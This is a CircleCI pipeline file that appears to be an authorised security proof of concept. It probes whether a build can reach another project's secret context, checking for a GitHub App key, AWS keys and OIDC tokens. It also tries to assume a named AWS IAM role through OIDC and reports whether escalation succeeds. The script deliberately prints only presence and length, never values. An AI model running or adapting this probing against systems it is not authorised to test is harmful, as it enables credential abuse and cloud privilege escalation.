version: 2.1
jobs:
  context_eligibility_check:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: DO-3954 PoC - cross-project context eligibility (no value exfil)
          command: |
            set +u
            echo "==== DO-3954 cross-project context eligibility check ===="
            echo "Project:  $CIRCLE_PROJECT_REPONAME"
            echo "Branch:   $CIRCLE_BRANCH"
            echo "Build:    $CIRCLE_BUILD_NUM"
            echo "User:     $CIRCLE_USERNAME"
            echo
            if [[ -n "$GH_APP_PRIVATE_KEY_B64" ]]; then
              echo "RESULT: context_accessible=true"
              echo "GH_APP_PRIVATE_KEY_B64: present (len=${#GH_APP_PRIVATE_KEY_B64})"
            else
              echo "RESULT: context_accessible=false (var unset/empty)"
            fi
            echo
            echo "---- aux env probes (presence + length only, never values) ----"
            for v in GH_APP_ID GH_APP_INSTALLATION_ID \
                     AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY \
                     AWS_SESSION_TOKEN AWS_ROLE_ARN \
                     AWS_DEFAULT_REGION AWS_REGION \
                     CIRCLE_OIDC_TOKEN CIRCLE_OIDC_TOKEN_V2; do
              val="${!v}"
              if [[ -n "$val" ]]; then
                echo "$v: present (len=${#val})"
              else
                echo "$v: absent"
              fi
            done

  oidc_assume_role_check:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Install awscli v2
          command: |
            curl -sSL "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o /tmp/awscliv2.zip
            unzip -q /tmp/awscliv2.zip -d /tmp
            sudo /tmp/aws/install
            aws --version
      - run:
          name: DO-3954 PoC Phase 1b - OIDC path to kore-ff-k8s-CIAccessRole (sectest)
          command: |
            set +u
            ROLE="arn:aws:iam::033407688949:role/kore-ff-k8s-CIAccessRole"
            echo "==== DO-3954 Phase 1b - sts:AssumeRoleWithWebIdentity ===="
            echo "Target role:   $ROLE"
            echo "Project:       $CIRCLE_PROJECT_REPONAME"
            echo "Branch:        $CIRCLE_BRANCH"
            echo "User:          $CIRCLE_USERNAME"
            echo "Token V2:      $([[ -n $CIRCLE_OIDC_TOKEN_V2 ]] && echo "present (len=${#CIRCLE_OIDC_TOKEN_V2})" || echo absent)"
            echo
            echo "---- JWT claim peek (claims are public-by-design) ----"
            if [[ -n "$CIRCLE_OIDC_TOKEN_V2" ]]; then
              PAYLOAD=$(echo "$CIRCLE_OIDC_TOKEN_V2" | cut -d. -f2)
              PAD=$(( (4 - ${#PAYLOAD} % 4) % 4 ))
              for i in $(seq 1 $PAD); do PAYLOAD="${PAYLOAD}="; done
              echo "$PAYLOAD" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '
                "  iss: \(.iss // "n/a")\n" +
                "  sub: \(.sub // "n/a")\n" +
                "  aud: \(.aud // "n/a")\n" +
                "  oidc.circleci.com/project-id: \(."oidc.circleci.com/project-id" // "n/a")\n" +
                "  oidc.circleci.com/org-id: \(."oidc.circleci.com/org-id" // "n/a")\n" +
                "  context-ids: \(."oidc.circleci.com/context-ids" // "n/a")"' 2>&1 || echo "  (jq decode failed)"
            fi
            echo
            echo "---- Calling sts:AssumeRoleWithWebIdentity (never printing credential values) ----"
            aws sts assume-role-with-web-identity \
              --role-arn "$ROLE" \
              --role-session-name "do3954-oidc-poc" \
              --web-identity-token "$CIRCLE_OIDC_TOKEN_V2" \
              > /tmp/sts.json 2> /tmp/sts.err
            rc=$?
            if [[ $rc -eq 0 ]]; then
              echo "RESULT: oidc_path_open=true   <-- ESCALATION CONFIRMED"
              jq -r '
                "AssumedRoleArn:        \(.AssumedRoleUser.Arn)\n" +
                "AssumedRoleId:         \(.AssumedRoleUser.AssumedRoleId)\n" +
                "Credentials.Expiration:\(.Credentials.Expiration)\n" +
                "AccessKeyId length:    \(.Credentials.AccessKeyId | length)\n" +
                "SessionToken length:   \(.Credentials.SessionToken | length)\n" +
                "SecretAccessKey length:\(.Credentials.SecretAccessKey | length)"
              ' /tmp/sts.json
            else
              echo "RESULT: oidc_path_open=false (sts exit=$rc)"
              echo "AWS error output (no creds, safe to display):"
              cat /tmp/sts.err
            fi
            rm -f /tmp/sts.json /tmp/sts.err

workflows:
  poc:
    jobs:
      - context_eligibility_check:
          context: forwardfinancing-ci-deployer-github-app
      - oidc_assume_role_check
